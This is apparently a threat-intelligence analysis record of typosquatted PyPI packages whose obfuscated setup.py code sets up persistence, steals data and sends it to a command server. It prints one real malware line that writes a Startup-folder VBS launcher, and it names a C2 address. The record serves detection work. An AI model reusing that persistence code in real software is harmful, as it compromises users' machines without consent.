package_info.package_name: pystob, pywool, pystallerer, pyioler, pyhulul, pyowler, and others
package_info.why_malicious: These packages are typosquats of popular Python libraries, containing obfuscated malicious code in setup.py that executes on install. The code achieves persistence, steals sensitive and financial data, exfiltrates it to attacker-controlled infrastructure, and uses anti-forensics techniques. Some variants use steganography to hide payloads in images, increasing stealth.

malicious_snippets.code_behavior: At installation time, the obfuscated code is deobfuscated and executed, enabling arbitrary payload execution including persistence, data theft, and further payload delivery.

malice_analysis.why_suspicious: Obfuscated code in setup.py is highly unusual and designed to evade detection. The use of dynamic code execution (eval/compile) is a red flag.
malice_analysis.violated_expectations: setup.py should only contain installation logic, not obfuscated or self-decrypting code.
malice_analysis.similar_legitimate_use: Obfuscation may be used for licensing or anti-tamper in rare commercial packages, but never in open-source install scripts.

    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Startup\\WING64.vbs", "a").write(f'Set WshShell = CreateObject("WScript.Shell") \nWshShell.Run chr(34) & "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe" & Chr(34), 0\nSet WshShell = Nothing')

malicious_snippets.code_behavior: At installation time, the code creates persistence by writing VBS and batch files to the user's startup folders, downloads a malicious executable from an external server, and ensures it runs on system startup.

malice_analysis.why_suspicious: setup.py should not create startup scripts or download executables. The use of Windows startup folders and external downloads is a hallmark of malware.
malice_analysis.violated_expectations: Normal packages do not alter startup folders or download/run binaries.
malice_analysis.similar_legitimate_use: Enterprise installers may set up auto-start, but never via PyPI setup.py.

malice_analysis.similar_legitimate_use: Telemetry in enterprise software, but never in open-source install scripts.

attack_chain.action: User installs a typosquatted malicious package from PyPI.
Obfuscated code in setup.py is deobfuscated and executed, enabling arbitrary payload execution.
attack_chain.leads_to: Persistence setup and/or steganography payload download

attack_chain.action: Persistence is established via VBS/batch files and a malicious executable is downloaded and run.
Malicious executable collects sensitive data (system, browser, wallet), writes to files, exfiltrates to C2, and deletes evidence.
Alternatively, setup.py downloads a PNG image with a hidden payload, decodes and executes it.
Decoded payload collects public IP and machine UUID, exfiltrates to C2.

behavioral_signatures: Dynamic code execution (eval/exec/compile) in install scripts
Creation of files in Windows Startup folders
Download and execution of external binaries during install
Use of steganography (image download and decode) in install scripts
Exfiltration of sensitive data to hardcoded IPs/domains
Immediate deletion of evidence files after exfiltration
file_indicators: setup.py containing obfuscated or encoded strings
WIN32.vbs, WIN32.bat, WING64.vbs, Runtime.exe in user startup folders
detection_knowledge.how_to_detect: Monitor for obfuscated or dynamically executed code in setup.py during package installation. Flag any package that writes to Windows Startup folders, downloads executables, or downloads and decodes images for execution. Alert on outbound connections to known C2 IPs (51.178.25.148:8081) and Discord webhooks. Detect creation of suspicious files (e.g., *.armageddon, uwu.png) and immediate deletion patterns. Use static and dynamic analysis to identify steganography or anti-forensics behaviors.
